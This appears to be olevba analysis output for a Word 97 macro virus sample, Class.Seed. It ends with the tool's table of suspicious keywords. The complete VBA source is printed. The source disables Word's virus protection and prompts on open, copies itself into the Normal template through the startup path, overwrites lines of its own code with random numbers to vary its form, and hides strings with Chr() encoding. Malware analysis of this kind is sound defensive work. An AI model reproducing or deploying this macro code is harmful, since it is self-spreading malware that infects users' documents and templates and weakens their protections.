olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.x-b5ec39e5b46d0b76caba855de775abda6768224a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.x-b5ec39e5b46d0b76caba855de775abda6768224a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Randomize

s = 0: r = 0

On Error GoTo 87

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If xf > 90 And fx > 0 Then GoTo 87

If xf < 90 Then

    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)

    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name

    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)

End If

If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)

k = Int(Rnd(1) * 100) + 1

If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)

l = Int(Rnd(1) * 75) + 1

If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)

m = Int(Rnd(1) * 50) + 1

If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

n = Int(Rnd(1) * 25) + 1

If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68)

xs.codemodule.AddFromFile Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)

With xs.codemodule

    For poly = 1 To 4

    .deletelines 1

    Next poly

End With

If xf < 90 Then

    With xs.codemodule

    .replaceline 1, "Sub AutoClose()"

    .replaceline 93, "Sub ToolsMacro()"

    End With

End If

With xs.codemodule

    For poly = 2 To 92 Step 2

    r = Int(Rnd(412835) * 203989) + 8485

    s = Int(Rnd(384958) * 285865) + 2988

    .replaceline poly, "'" & r * r & s * s & r * r * s * s & r * r & s * s & r * r

Next poly

End With

87:

If xf > 90 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode()
'Word97/Class.Seed by Virus :)
End Sub


















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
+----------+--------------------+---------------------------------------------+

